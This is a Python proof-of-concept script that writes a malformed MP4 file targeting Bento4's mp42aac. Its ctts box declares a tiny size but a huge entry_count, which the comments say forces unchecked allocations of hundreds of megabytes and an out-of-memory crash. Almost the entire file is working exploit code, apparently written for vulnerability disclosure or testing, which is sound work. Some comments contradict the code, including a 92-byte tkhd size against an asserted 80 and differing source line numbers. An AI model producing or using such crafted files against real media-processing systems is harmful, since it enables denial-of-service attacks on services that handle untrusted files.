#!/usr/bin/env python3
"""
PoC generator for VULN 002 - AP4_CttsAtom Missing entry_count Bounds Check
Bento4 mp42aac binary - Uncontrolled Memory Allocation (DoS)

Vulnerability location: Ap4CttsAtom.cpp lines 78-82
Root cause: ctts atom constructor reads entry_count with NO bounds check
against the atom's declared size, then calls:
  m_Entries.SetItemCount(entry_count)  -> large vector allocation
  new unsigned char[entry_count*8]     -> massive buffer allocation
"""

import struct
import os

OUTPUT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002.mp4")


def box(box_type: bytes, payload: bytes) -> bytes:
    """Build an MP4 box with 8-byte header (size + type) + payload."""
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type + payload


def fullbox(box_type: bytes, version: int, flags: int, payload: bytes) -> bytes:
    """Build a FullBox (version + flags prefix before payload)."""
    vf = struct.pack(">I", (version << 24) | (flags & 0xFFFFFF))
    return box(box_type, vf + payload)


# ── ftyp ──────────────────────────────────────────────────────────────────────
ftyp_payload = (
    b"M4A "          # major brand
    + struct.pack(">I", 0)   # minor version
    + b"M4A " + b"mp42" + b"isom"  # compatible brands
)
ftyp = box(b"ftyp", ftyp_payload)

# ── mvhd (version 0, 96 bytes of data after 8-byte header) ────────────────────
# version=0: creation(4)+modification(4)+timescale(4)+duration(4)+rate(4)+
#            volume(2)+reserved(10)+matrix(36)+pre_defined(24)+next_track(4) = 96
mvhd_payload = struct.pack(
    ">IIIII",
    0,          # creation_time
    0,          # modification_time
    44100,      # timescale
    0,          # duration
    0x00010000  # rate = 1.0
)
mvhd_payload += struct.pack(">H", 0x0100)   # volume = 1.0
mvhd_payload += b"\x00" * 10               # reserved
mvhd_payload += struct.pack(">9i",          # matrix (identity)
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)
mvhd_payload += b"\x00" * 24               # pre_defined
mvhd_payload += struct.pack(">I", 1)       # next_track_id
assert len(mvhd_payload) == 96
mvhd = fullbox(b"mvhd", 0, 0, mvhd_payload)

# ── tkhd (version 0, 92 bytes of data after 8-byte header) ────────────────────
# creation(4)+modification(4)+track_id(4)+reserved(4)+duration(4)+
# reserved2(8)+layer(2)+alt_group(2)+volume(2)+reserved3(2)+matrix(36)+
# width(4)+height(4) = 92
tkhd_payload = struct.pack(
    ">IIIII",
    0,  # creation_time
    0,  # modification_time
    1,  # track_id
    0,  # reserved
    0   # duration
)
tkhd_payload += b"\x00" * 8               # reserved
tkhd_payload += struct.pack(">HHH", 0, 0, 0)  # layer, alt_group, volume
tkhd_payload += b"\x00" * 2               # reserved
tkhd_payload += struct.pack(">9i",         # matrix (identity)
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)
tkhd_payload += struct.pack(">II", 0, 0)  # width, height
assert len(tkhd_payload) == 80
tkhd = fullbox(b"tkhd", 0, 3, tkhd_payload)  # flags=3 (track_enabled | track_in_movie)

# ── mdhd (version 0, 24 bytes of data after 8-byte header) ────────────────────
# creation(4)+modification(4)+timescale(4)+duration(4)+language(2)+pre_defined(2)
mdhd_payload = struct.pack(
    ">IIII",
    0,      # creation_time
    0,      # modification_time
    44100,  # timescale
    0       # duration
)
mdhd_payload += struct.pack(">HH", 0x55C4, 0)  # language='und', pre_defined
assert len(mdhd_payload) == 20
mdhd = fullbox(b"mdhd", 0, 0, mdhd_payload)

# ── hdlr ──────────────────────────────────────────────────────────────────────
# pre_defined(4)+handler_type(4)+reserved(12)+name(null-terminated)
hdlr_payload = (
    struct.pack(">I", 0)    # pre_defined
    + b"soun"               # handler_type
    + b"\x00" * 12          # reserved
    + b"SoundHandler\x00"   # name (null-terminated)
)
hdlr = fullbox(b"hdlr", 0, 0, hdlr_payload)

# ── smhd ──────────────────────────────────────────────────────────────────────
# balance(2)+reserved(2)
smhd_payload = struct.pack(">HH", 0, 0)
smhd = fullbox(b"smhd", 0, 0, smhd_payload)

# ── dref (url entry) ──────────────────────────────────────────────────────────
url_entry_payload = struct.pack(">I", 0x000001)  # version/flags: flags=1 (self-contained)
url_entry = box(b"url ", url_entry_payload)       # size=12 total
dref_payload = struct.pack(">I", 1) + url_entry   # entry_count=1
dref = fullbox(b"dref", 0, 0, dref_payload)

# ── dinf ──────────────────────────────────────────────────────────────────────
dinf = box(b"dinf", dref)

# ── stsd (no sample entries) ──────────────────────────────────────────────────
stsd = fullbox(b"stsd", 0, 0, struct.pack(">I", 0))  # entry_count=0

# ── stts (no entries) ─────────────────────────────────────────────────────────
stts = fullbox(b"stts", 0, 0, struct.pack(">I", 0))

# ── stsc (no entries) ─────────────────────────────────────────────────────────
stsc = fullbox(b"stsc", 0, 0, struct.pack(">I", 0))

# ── stsz (no entries) ─────────────────────────────────────────────────────────
# sample_size(4)+sample_count(4)
stsz = fullbox(b"stsz", 0, 0, struct.pack(">II", 0, 0))

# ── stco (no entries) ─────────────────────────────────────────────────────────
stco = fullbox(b"stco", 0, 0, struct.pack(">I", 0))

# ── ctts (MALICIOUS BOX) ──────────────────────────────────────────────────────
# Declared size = 16 (8 header + 4 version/flags + 4 entry_count)
# entry_count = 0x04000000 (67108864)
# This causes:
#   m_Entries.SetItemCount(0x04000000)  -> ~268MB vector allocation
#   new unsigned char[0x04000000 * 8]  -> 512MB buffer allocation
# Total allocation attempt: ~780MB -> OOM / crash
MALICIOUS_ENTRY_COUNT = 0x04000000

# Build the ctts box manually so declared size stays 16 regardless of entry_count
ctts_version_flags = struct.pack(">I", 0)           # version=0, flags=0
ctts_entry_count   = struct.pack(">I", MALICIOUS_ENTRY_COUNT)
ctts_payload       = ctts_version_flags + ctts_entry_count   # 8 bytes
ctts_size          = 16                              # 8 header + 8 payload (declared)
ctts = struct.pack(">I", ctts_size) + b"ctts" + ctts_payload

# ── stbl ──────────────────────────────────────────────────────────────────────
stbl_payload = stsd + stts + stsc + stsz + stco + ctts
stbl = box(b"stbl", stbl_payload)

# ── minf ──────────────────────────────────────────────────────────────────────
minf_payload = smhd + dinf + stbl
minf = box(b"minf", minf_payload)

# ── mdia ──────────────────────────────────────────────────────────────────────
mdia_payload = mdhd + hdlr + minf
mdia = box(b"mdia", mdia_payload)

# ── trak ──────────────────────────────────────────────────────────────────────
trak_payload = tkhd + mdia
trak = box(b"trak", trak_payload)

# ── moov ──────────────────────────────────────────────────────────────────────
moov_payload = mvhd + trak
moov = box(b"moov", moov_payload)

# ── Final MP4 ─────────────────────────────────────────────────────────────────
mp4_data = ftyp + moov

with open(OUTPUT_FILE, "wb") as f:
    f.write(mp4_data)

print(f"[+] PoC written to: {OUTPUT_FILE}")
print(f"[+] File size: {len(mp4_data)} bytes")
print(f"[+] Malicious ctts entry_count: 0x{MALICIOUS_ENTRY_COUNT:08X} ({MALICIOUS_ENTRY_COUNT})")
print(f"[+] Expected allocation attempt: ~{MALICIOUS_ENTRY_COUNT * 8 // (1024*1024)} MB (new unsigned char[])")
print(f"[+] Plus SetItemCount vector:    ~{MALICIOUS_ENTRY_COUNT * 4 // (1024*1024)} MB (AP4_Array)")
print(f"[+] Total allocation attempt:   ~{MALICIOUS_ENTRY_COUNT * 12 // (1024*1024)} MB")
print("[+] Vulnerability: Ap4CttsAtom.cpp lines 79-80 - no bounds check on entry_count")
